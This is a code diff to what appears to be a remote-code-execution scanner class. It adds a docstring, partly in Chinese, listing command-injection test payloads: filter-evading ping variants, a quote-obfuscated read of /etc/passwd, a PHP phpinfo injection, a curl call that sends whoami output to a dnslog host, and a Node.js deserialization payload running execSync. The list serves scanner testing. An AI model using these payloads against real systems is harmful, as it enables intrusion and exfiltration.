@@ -70,6 +70,20 @@ class RceScan(ScanBase):
         return False
 
     def dnslogbased(self, loc, key):
+        '''
+        利用dnslog检测RCE，目前主要是傻瓜怼payload模式
+        + | p$IFSing -c 1 {randomStr}.dnslog.com;
+        + ; p$IFSing -c 1 {randomStr}.dnslog.com;
+        + `p$IFSing -c 1 {randomStr}.dnslog.com`;
+        + /b?n/p?ng -c 1 blog.donot.me;
+        + /'b'i'n'/'c'a't' /'e't'c'/'p'a's's'w'd;
+        + /b\i\n/w\h\i\c\h n\c;
+        + pi$9ng -c 1 blog.donot.me;
+        + {${phpinfo()}}
+        + $(curl h ttp://paopao3.xxxx.dnslog. info/?whoami=`whoami`) - referer
+        + _$$ND_FUNC$$_function(){return require('child_process').execSync('whoami',(e,out,err)=>{console.log(out);}); }()
+
+        '''
         return False
 
     def weblogbased(self, loc, key):
